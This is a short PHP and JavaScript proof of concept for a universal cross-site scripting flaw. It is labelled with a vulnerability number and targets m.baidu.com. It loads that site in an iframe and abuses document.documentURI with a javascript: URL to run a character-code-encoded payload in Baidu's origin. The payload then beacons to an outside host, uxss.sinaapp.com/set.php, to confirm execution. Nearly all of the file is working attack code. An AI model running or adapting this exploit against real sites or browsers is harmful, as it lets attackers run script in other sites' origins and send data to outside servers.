<?php
//漏洞编号90222
?>
<?php
$code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
$str = "var flag=0;suc();function suc(){if(flag){return;}if(document.domain == 'm.baidu.com'){flag=1;new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=6';}}";
//$str = "if(document.domain == 'm.baidu.com'){alert(1)}";

$tmp = str_split($str);
$result = array();

foreach($tmp as $key => $value){
    $result[$key] = ord($value);
}

$input = implode(",", $result);

?>

<body>
<script>
i = document.body.appendChild(document.createElement("iframe"));
i.src = "http://m.baidu.com";
i.onload = function()
{
	document.documentURI = "javascript://hostname.com/%0D%0Aeval(String.fromCharCode(<?php echo $input; ?>))";
	i.contentWindow.location = "";

}
</script>
</body>